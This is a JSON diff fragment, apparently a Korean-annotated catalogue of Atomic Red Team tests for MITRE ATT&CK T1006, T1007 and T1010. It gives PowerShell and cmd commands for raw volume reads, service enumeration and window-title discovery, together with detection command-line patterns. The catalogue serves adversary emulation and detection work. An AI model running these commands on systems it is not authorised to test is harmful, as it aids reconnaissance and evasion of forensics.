+      "metadata": {
+        "atomic_source_id": "d3d9af44-b8ad-4375-8b0a-4bff4b7e419c",
+        "reference_links": [
+          "https://attack.mitre.org/techniques/T1005/",
+          "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1005"
+        ]
+      }
+    }
+  ]
+},{
+  "technique_id": "T1006",
+  "technique_name": "Direct Volume Access",
+  "tactic": "Defense Evasion",
+  "source": "AtomicRedTeam",
+  "description": "이 기법은 파일 시스템 계층을 우회하고 디스크 볼륨에 직접 접근하는 행위이다. 공격자는 \\\\.\\C: 와 같은 DOS 디바이스 경로를 사용해 부트 섹터나 파티션 영역을 직접 읽어 포렌식 도구를 우회하거나 숨겨진 데이터/부트킷을 확인할 수 있다. 보통 관리자 권한이 필요하며, 일반 파일 접근 로그만으로는 탐지하기 어렵기 때문에 로우 디스크 핸들 사용 여부 등을 별도 모니터링해야 한다.",
+  "tests": [
+    {
+      "test_id": "T1006-1",
+      "name": "Read volume boot sector via DOS device path (PowerShell)",
+      "platforms": [
+        "windows"
+      ],
+      "summary": "PowerShell에서 \\\\.\\ 디바이스 경로를 사용해 볼륨 핸들을 직접 열고, 첫 11바이트를 읽어 부트 섹터 내용을 HEX로 출력한다. NTFS 볼륨인 경우 \"EB 52 90 4E 54 46 53\"(NTFS 시그니처)이 확인될 수 있다.",
+      "procedure": [
+        "입력 인자 volume(기본 'C:') 값을 사용해 타깃 드라이브를 결정한다.",
+        "PowerShell에서 IO.FileStream을 이용해 \"\\\\.\\#{volume}\" 경로로 볼륨 핸들을 연다.",
+        "길이가 11인 바이트 배열 버퍼를 생성한 뒤, 볼륨의 처음 11바이트를 읽어 버퍼에 저장한다.",
+        "핸들을 닫고, Format-Hex cmdlet으로 버퍼 내용을 헥스 덤프로 출력해 부트 섹터 시그니처를 확인한다."
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": true,
+          "command": "$buffer = New-Object byte[] 11; $handle = New-Object IO.FileStream \"\\\\.\\#{volume}\", 'Open', 'Read', 'ReadWrite'; $handle.Read($buffer, 0, $buffer.Length) | Out-Null; $handle.Close(); Format-Hex -InputObject $buffer"
+        }
+      ],
+      "prerequisites": [
+        "volume 인자로 지정된 드라이브 문자(예: 'C:')가 실제로 존재하고 온라인 상태여야 한다.",
+        "로컬 관리자 권한 또는 해당 볼륨에 대한 로우 디스크 읽기 권한이 있는 PowerShell 세션에서 실행해야 한다.",
+        "PowerShell 환경에 Format-Hex cmdlet(예: PowerShell 5 이상 또는 호환 모듈)이 사용 가능해야 한다."
+      ],
+      "artifacts": {
+        "files_created": [],
+        "files_read": [
+          {
+            "path": "\\\\.\\C:",
+            "description": "테스트 시 디바이스 경로를 통해 직접 읽히는 NTFS 볼륨(기본값, 실제 실행 시 volume 인자 값으로 대체)"
+          }
+        ],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "powershell.exe",
+            "description": "IO.FileStream을 사용해 디스크 볼륨을 직접 열고 부트 섹터 일부를 읽어오는 데 사용된 프로세스",
+            "commandline_pattern": "New-Object IO.FileStream \"\\\\.\\*\", 'Open', 'Read', 'ReadWrite'"
+          }
+        ],
+        "network": []
+      },
+      "cleanup": [
+        "테스트는 디스크 내용을 읽기만 하므로 별도의 파일/레지스트리 클린업은 필요 없다.",
+        "운영 환경에서는 디바이스 경로를 이용한 비정상적인 powershell.exe 사용 여부를 로깅·모니터링 항목에 포함할 수 있다."
+      ],
+      "tags": {
+        "action": [
+          "process_start",
+          "raw_disk_read"
+        ],
+        "domain": [
+          "DefenseEvasion",
+          "Collection"
+        ],
+        "ttp": [
+          "Direct_Volume_Access"
+        ]
+      },
+      "metadata": {
+        "atomic_source_id": "88f6327e-51ec-4bbf-b2e8-3fea534eab8b",
+        "reference_links": [
+          "https://attack.mitre.org/techniques/T1006/",
+          "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1006",
+          "https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths"
+        ]
+      }
+    }
+  ]
+},
+{
+  "technique_id": "T1007",
+  "technique_name": "System Service Discovery",
+  "tactic": "Discovery",
+  "source": "AtomicRedTeam",
+  "description": "이 기법은 호스트에서 실행 중이거나 설치된 시스템 서비스 목록을 수집하는 행위이다. 공격자는 서비스 이름, 상태, 시작 유형 등을 확인해 권한 상승, 지속성 유지, 방화벽·보안 제품 등의 존재를 파악할 수 있다. 주로 tasklist, sc, net, PowerShell Get-Service 같은 기본 도구를 사용하며, 서비스 구성 정보를 바탕으로 이후 공격 단계를 설계한다.",
+  "tests": [
+    {
+      "test_id": "T1007-1",
+      "name": "System Service Discovery",
+      "platforms": [
+        "windows"
+      ],
+      "summary": "tasklist.exe와 sc.exe를 이용해 현재 시스템에 존재하는 서비스와 프로세스를 열거한다. 결과는 콘솔(stdout)에 출력되며, 서비스 상태 및 전체 서비스 목록을 확인할 수 있다.",
+      "procedure": [
+        "cmd.exe에서 tasklist.exe를 실행해 현재 실행 중인 프로세스 목록을 조회한다.",
+        "sc query 명령으로 기본 서비스 상태(예: RUNNING, STOPPED)를 조회한다.",
+        "sc query state= all 명령으로 모든 상태의 서비스를 포함한 전체 서비스 목록을 조회한다."
+      ],
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": true,
+          "command": "tasklist.exe\r\nsc query\r\nsc query state= all"
+        }
+      ],
+      "prerequisites": [
+        "Windows 환경에서 cmd.exe, tasklist.exe, sc.exe가 기본 경로에 존재해야 한다.",
+        "일부 서비스 정보 조회에는 관리자 권한이 필요할 수 있으므로, 관리자 권한 콘솔에서 실행하는 것이 권장된다."
+      ],
+      "artifacts": {
+        "files_created": [],
+        "files_read": [],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "cmd.exe",
+            "description": "서비스 및 프로세스 열거 명령을 실행하는 셸",
+            "commandline_pattern": "tasklist.exe && sc query*"
+          },
+          {
+            "name": "tasklist.exe",
+            "description": "현재 실행 중인 프로세스 목록을 나열하는 유틸리티",
+            "commandline_pattern": "tasklist.exe"
+          },
+          {
+            "name": "sc.exe",
+            "description": "서비스 상태 및 구성을 조회하는 Service Control 유틸리티",
+            "commandline_pattern": "sc query*"
+          }
+        ],
+        "network": []
+      },
+      "cleanup": [
+        "테스트는 조회만 수행하므로 별도의 파일/레지스트리 클린업은 필요 없다.",
+        "명령 실행 로그(콘솔 기록, 명령 기록 등)를 수집·모니터링해 비정상적인 대량 서비스 열거를 탐지할 수 있다."
+      ],
+      "tags": {
+        "action": [
+          "process_start",
+          "service_enumeration"
+        ],
+        "domain": [
+          "Discovery"
+        ],
+        "ttp": [
+          "System_Service_Discovery"
+        ]
+      },
+      "metadata": {
+        "atomic_source_id": "89676ba1-b1f8-47ee-b940-2e1a113ebc71",
+        "reference_links": [
+          "https://attack.mitre.org/techniques/T1007/",
+          "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1007"
+        ]
+      }
+    },
+    {
+      "test_id": "T1007-2",
+      "name": "System Service Discovery - net.exe",
+      "platforms": [
+        "windows"
+      ],
+      "summary": "net.exe start 명령을 사용해 시작된 서비스 목록을 열거하고, 결과를 파일로 리다이렉트해 저장한다. 여러 위협 그룹이 서비스 인벤토리를 수집할 때 사용하는 방식과 유사하다.",
+      "procedure": [
+        "net.exe start 명령을 실행해 현재 시작된 서비스 목록을 조회한다.",
+        "명령 출력 결과를 리다이렉트 연산자(>>)를 사용해 지정된 텍스트 파일(기본값: %temp%\\service-list.txt)에 저장한다.",
+        "생성된 service-list.txt 파일을 열어 어떤 서비스가 실행 중인지 확인할 수 있다."
+      ],
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": false,
+          "command": "net.exe start >> #{output_file}"
+        }
+      ],
+      "prerequisites": [
+        "Windows 환경에서 net.exe가 사용 가능해야 한다(기본 제공).",
+        "output_file 경로(기본: %temp%\\service-list.txt)에 파일을 생성·쓰기 할 수 있는 권한이 필요하다."
+      ],
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "%temp%\\service-list.txt",
+            "description": "net.exe start 출력 결과가 저장된 서비스 목록 파일"
+          }
+        ],
+        "files_read": [],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "cmd.exe",
+            "description": "net.exe 명령을 실행하는 콘솔",
+            "commandline_pattern": "net.exe start >> *service-list.txt"
+          },
+          {
+            "name": "net.exe",
+            "description": "시작된 서비스를 나열하는 명령줄 유틸리티",
+            "commandline_pattern": "net.exe start"
+          }
+        ],
+        "network": []
+      },
+      "cleanup": [
+        "테스트 후 생성된 서비스 목록 파일(기본: %temp%\\service-list.txt)을 삭제해 흔적을 줄일 수 있다.",
+        "보안 관점에서는 net.exe start 호출 내역과 임시 디렉터리의 서비스 인벤토리 파일 생성 여부를 모니터링할 수 있다."
+      ],
+      "tags": {
+        "action": [
+          "process_start",
+          "file_create",
+          "service_enumeration"
+        ],
+        "domain": [
+          "Discovery"
+        ],
+        "ttp": [
+          "System_Service_Discovery"
+        ]
+      },
+      "metadata": {
+        "atomic_source_id": "5f864a3f-8ce9-45c0-812c-bdf7d8aeacc3",
+        "reference_links": [
+          "https://attack.mitre.org/techniques/T1007/",
+          "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1007"
+        ]
+      }
+    },
+    {
+      "test_id": "T1007-3",
+      "name": "Get-Service Execution",
+      "platforms": [
+        "windows"
+      ],
+      "summary": "PowerShell의 Get-Service cmdlet을 실행해 로컬 시스템에 등록된 모든 서비스를 객체 형태로 나열한다. 서비스 이름, 상태, 표시 이름 등 메타데이터를 손쉽게 필터링·가공할 수 있다.",
+      "procedure": [
+        "cmd.exe에서 powershell.exe Get-Service 명령을 실행한다.",
+        "PowerShell은 ServiceController 객체 목록을 반환하며, 서비스 이름(Name), 표시 이름(DisplayName), 상태(Status) 등의 정보를 화면에 출력한다.",
+        "필요 시 결과를 Export-Csv 등으로 파일에 저장하거나, 특정 조건에 맞는 서비스만 필터링할 수 있다."
+      ],
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": false,
+          "command": "powershell.exe Get-Service"
+        }
+      ],
+      "prerequisites": [
+        "PowerShell이 설치되어 있어야 하며, PATH에 등록되어 있어야 한다(Windows 기본 제공).",
+        "일반적으로 관리자 권한이 없어도 서비스 목록 조회가 가능하지만, 일부 서비스 속성은 권한에 따라 제한될 수 있다."
+      ],
+      "artifacts": {
+        "files_created": [],
+        "files_read": [],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "cmd.exe",
+            "description": "powershell.exe Get-Service 명령을 호출하는 콘솔",
+            "commandline_pattern": "powershell.exe Get-Service"
+          },
+          {
+            "name": "powershell.exe",
+            "description": "Get-Service cmdlet을 실행해 서비스 정보를 열거하는 프로세스",
+            "commandline_pattern": "Get-Service"
+          }
+        ],
+        "network": []
+      },
+      "cleanup": [
+        "테스트는 조회만 수행하므로 추가적인 클린업은 필요 없다.",
+        "운영 환경에서는 비정상 계정 혹은 비정상 시간대의 대규모 Get-Service 실행 패턴을 모니터링 포인트로 활용할 수 있다."
+      ],
+      "tags": {
+        "action": [
+          "process_start",
+          "service_enumeration"
+        ],
+        "domain": [
+          "Discovery"
+        ],
+        "ttp": [
+          "System_Service_Discovery"
+        ]
+      },
+      "metadata": {
+        "atomic_source_id": "51f17016-d8fa-4360-888a-df4bf92c4a04",
+        "reference_links": [
+          "https://attack.mitre.org/techniques/T1007/",
+          "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1007"
+        ]
+      }
+    }
+  ]
+},
+{
+  "technique_id": "T1010",
+  "technique_name": "Application Window Discovery",
+  "tactic": "Discovery",
+  "source": "AtomicRedTeam",
+  "description": "애플리케이션 윈도우 검색은 현재 시스템에서 실행 중인 프로세스와 그에 대응하는 창 제목(윈도우 타이틀)을 나열하는 기법이다. 공격자는 이를 통해 사용자가 어떤 프로그램과 문서를 열어 두었는지 파악하고, 추가 공격 대상(브라우저, 메일 클라이언트, RDP 창 등)을 식별할 수 있다. 보안 우회나 정보 수집 단계에서 자주 사용되며, 원격 제어 악성코드가 피해자 화면 상태를 추적하는 데 활용된다.",
+  "tests": [
+    {
+      "test_id": "T1010-1",
+      "name": "List Process Main Windows - C# .NET",
+      "platforms": [
+        "windows"
+      ],
+      "summary": "C# .NET 코드(T1010.cs)를 컴파일해 실행 중인 프로세스의 메인 윈도우 제목을 나열한다. PowerShell이 원격에서 소스 코드를 내려받고, csc.exe로 EXE를 빌드한 뒤 T1010.exe를 실행해 각 프로세스와 연결된 윈도우 타이틀을 표준 출력으로 표시한다.",
+      "procedure": [
+        "입력 인자 input_source_code 경로(기본: PathToAtomicsFolder\\T1010\\src\\T1010.cs)에 C# 소스 파일이 존재하는지 확인한다. 없으면 GitHub 저장소에서 다운로드한다.",
+        "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe 컴파일러를 호출해 T1010.cs를 빌드하고, 출력 바이너리를 %TEMP%\\T1010.exe로 생성한다.",
+        "생성된 T1010.exe를 실행해 현재 시스템에서 메인 윈도우 핸들을 가진 프로세스를 열거하고, 각 프로세스 이름과 윈도우 제목을 콘솔로 출력한다.",
+        "테스트 종료 후 임시 실행 파일(T1010.exe)을 삭제해 환경을 정리한다."
+      ],
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": false,
+          "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:#{output_file_name} \"#{input_source_code}\"\r\n#{output_file_name}"
+        }
+      ],
+      "prerequisites": [
+        ".NET Framework v4.0.30319 이상이 설치되어 있고 C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe 경로에 C# 컴파일러가 존재해야 한다.",
+        "지정된 input_source_code 경로(PathToAtomicsFolder\\T1010\\src\\T1010.cs)에 T1010.cs 소스 파일이 존재해야 한다. 없을 경우 사전 단계에서 GitHub 원격 저장소에서 다운로드한다.",
+        "네트워크를 통해 raw.githubusercontent.com에 접근할 수 있어야 T1010.cs를 자동으로 내려받을 수 있다."
+      ],
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "%TEMP%\\T1010.exe",
+            "description": "C# 소스(T1010.cs)를 csc.exe로 컴파일해 생성된 윈도우 타이틀 열거용 실행 파일"
+          }
+        ],
+        "files_read": [
+          {
+            "path": "PathToAtomicsFolder\\T1010\\src\\T1010.cs",
+            "description": "프로세스 목록과 메인 윈도우 제목을 나열하는 C# 소스 코드"
+          }
+        ],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "powershell.exe",
+            "description": "GitHub에서 T1010.cs 소스를 다운로드하거나 존재 여부를 검사하는 데 사용된 PowerShell 프로세스",
+            "commandline_pattern": "Invoke-WebRequest *T1010.cs*"
+          },
+          {
+            "name": "csc.exe",
+            "description": "T1010.cs를 컴파일해 T1010.exe 실행 파일을 생성하는 C# 컴파일러 프로세스",
+            "commandline_pattern": "csc.exe -out:%TEMP%\\T1010.exe *T1010.cs*"
+          },
+          {
+            "name": "T1010.exe",
+            "description": "실행 중인 프로세스의 메인 윈도우 제목을 나열하는 사용자 정의 도구 실행 파일",
+            "commandline_pattern": "%TEMP%\\T1010.exe"
+          }
+        ],
+        "network": [
+          {
+            "description": "raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs 에 대한 HTTP/HTTPS 요청(소스 코드 다운로드)",
+            "destination": "raw.githubusercontent.com:443"
+          }
+        ]
+      },
+      "cleanup": [
+        "테스트 후 생성된 실행 파일 %TEMP%\\T1010.exe를 삭제해 디스크 흔적을 정리한다.",
+        "원하지 않을 경우 PathToAtomicsFolder\\T1010\\src\\T1010.cs로 다운로드한 소스 파일도 삭제하거나 별도 샘플 보관 폴더로 이동할 수 있다."
+      ],
+      "tags": {
+        "action": [
+          "process_start",
+          "file_create",
+          "network_connection"
+        ],
+        "domain": [
+          "Discovery"
+        ],
+        "ttp": [
+          "Application_Window_Discovery"
+        ]
+      },
+      "metadata": {
+        "atomic_source_id": "fe94a1c3-3e22-4dc9-9fdf-3a8bdbc10dc4",
+        "reference_links": [
+          "https://attack.mitre.org/techniques/T1010/",
+          "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1010"
+        ]
+      }
+    }
+  ]
+}
+
+
+
+
+
+
+]
